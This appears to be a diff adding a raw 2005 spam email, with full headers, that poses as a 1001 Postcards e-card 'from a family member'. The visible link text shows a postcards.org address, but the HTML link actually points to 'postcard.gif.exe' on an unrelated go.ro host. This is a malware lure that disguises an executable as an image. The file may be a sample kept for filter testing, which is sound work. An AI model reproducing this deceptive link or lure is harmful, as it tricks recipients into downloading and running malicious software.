@@ -1,0 +1,62 @@
+Return-Path: <chris@CircTrainers.baseview.com>
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 2905 invoked by uid 115); 17 May 2005 10:23:06 -0000
+Received: from chris@CircTrainers.baseview.com by churchill by uid 64011 with qmail-scanner-1.22 
+ ( Clear:RC:0(12.37.93.65):. 
+ Processed in 0.136149 secs); 17 May 2005 10:23:06 -0000
+Received: from ftp01.baseview.com (HELO CircTrainers.baseview.com) (12.37.93.65)
+  by churchill.factcomp.com with SMTP; 17 May 2005 10:23:04 -0000
+Received: by CircTrainers.baseview.com (Postfix, from userid 1030)
+	id AB7813C2CAF; Tue, 17 May 2005 03:52:02 -0400 (EDT)
+To: bruceg@em.ca
+Subject:  You've received a postcard from a family member!
+From: postcards.org <postcard@postcards.org>
+Content-Type: text/html
+Message-Id: <20050517075202.AB7813C2CAF@CircTrainers.baseview.com>
+Date: Tue, 17 May 2005 03:52:02 -0400 (EDT)
+Content-Length: 2280
+
+
+<HTML><HEAD><TITLE>postcards.org</TITLE>
+<META NAME="a">
+<METAA NAME="description" content="a">
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<META content="MSHTML 6.00.2800.1400" name=GENERATOR></HEAD>
+<BODY bgColor=#FFFFFF link=#000099 vLink=#FF0000>
+<div align="center">
+  <p align="left">&nbsp;
+  <p align="left"><font size="2" face="Arial">You have just received a virtual 
+    postcard from a family member!</font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <p align="left"><font size="2" face="Arial">You can pick up your postcard at 
+    the following web address:</font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <p align="left"><font size="2" face="Arial"><A
+href="http://www.post.card.go.ro/postcard.gif.exe"
+target=_blank>http://www2.postcards.org/?a91-valets-cloud-31337</A></font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <p align="left"><font size="2" face="Arial">If you can't click on the web address 
+    above, you can also<br>
+    visit 1001 Postcards at http://www.postcards.org/postcards/<br>
+    and enter your pickup code, which is: a91-valets-cloud-mad</font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <P align="left"><font size="2" face="Arial">(Your postcard will be available 
+    for 60 days.)</font></P>
+  <P align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></P>
+  <p align="left"><font size="2" face="Arial">Oh -- and if you'd like to reply 
+    with a postcard,<br>
+    you can do so by visiting this web address:<br>
+    http://www2.postcards.org/<br>
+    (Or you can simply click the &quot;reply to this postcard&quot;<br>
+    button beneath your postcard!)</font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <p align="left"><font size="2" face="Arial">We hope you enjoy your postcard, 
+    and if you do,<br>
+    please take a moment to send a few yourself!</font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <p align="left"><font size="2" face="Arial">Regards,<br>
+    1001 Postcards<br>
+    http://www.postcards.org/postcards/ </font></p>
+</p>
+  </div>
+</BODY></HTML>
